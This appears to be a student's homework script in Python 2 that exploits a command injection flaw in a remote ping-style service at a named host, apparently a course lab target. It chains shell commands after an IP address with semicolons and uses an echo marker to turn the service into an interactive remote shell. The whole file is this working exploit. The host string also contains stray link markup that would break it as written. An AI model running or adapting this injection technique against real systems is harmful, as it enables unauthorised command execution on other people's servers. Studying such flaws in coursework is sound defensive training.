# code for hw 4
import socket

host = "cornerstoneairlines.co <http://cornerstoneairlines.co/>"
port = 45

def execute_cmd(cmd):
    # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))

    data = s.recv(1024)
 
    print("SENDING: " + cmd)
    s.send(cmd)
    output = s.recv(1024)
    return output


if __name__ == '__main__':
    print("$ "),
    input_1 = raw_input()
    if input_1 == "shell":
        cmd = "8.8.8.8"
        print("$ "),
        input_2 = raw_input()
        input_3 = 123549092
        while input_2 != "quit":
            input_3 += 56
            cmd = cmd + " ; echo " + str(input_3) + " ; " + input_2
            out = execute_cmd(cmd + "\n")
            print(out[out.index(str(input_3)) + len(str(input_3)):])
            print("$ "),
            input_2 = raw_input()
